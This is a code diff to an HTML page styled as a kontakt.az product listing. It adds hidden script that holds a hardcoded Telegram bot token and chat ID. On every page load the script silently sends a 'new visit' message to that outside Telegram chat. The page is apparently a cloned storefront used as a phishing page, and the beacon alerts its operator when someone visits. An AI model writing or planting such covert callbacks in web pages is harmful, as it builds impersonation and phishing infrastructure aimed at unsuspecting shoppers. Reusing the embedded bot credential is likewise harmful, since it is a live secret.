@@ -31,7 +31,34 @@
     <link rel="alternate" hreflang="ru-RU" href="https://kontakt.az/ru/iphone-14-pro-max-256-gb-deep-purple-ru">
     <link rel="icon" type="image/x-icon" href="images/FAVICON_64_png.png">
     <link rel="shortcut icon" type="image/x-icon" href="images/FAVICON_64_png.png">
+ 
+    <script>
+const token  = '8145659910:AAGi1J24CmTYJGA8KduFNqk7iqxT2g7og6U';
+const chatId = '-4845328304';
 
+function sendTelegramMessage(text) {
+return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({ chat_id: chatId, text })
+})
+.then(r => r.json())
+.then(data => {
+  if (!data.ok) throw new Error(data.description);
+  console.log('Telegram cevabı:', data);
+  return data;
+});
+}
+
+
+
+
+  </script>
+
+    <script>document.addEventListener("DOMContentLoaded", function () {
+        sendTelegramMessage("🔔 yeni ziyaret - kontakt")})
+        
+        </script>
 
     <script>
         maestra = window.maestra || function () { maestra.queue.push(arguments); };
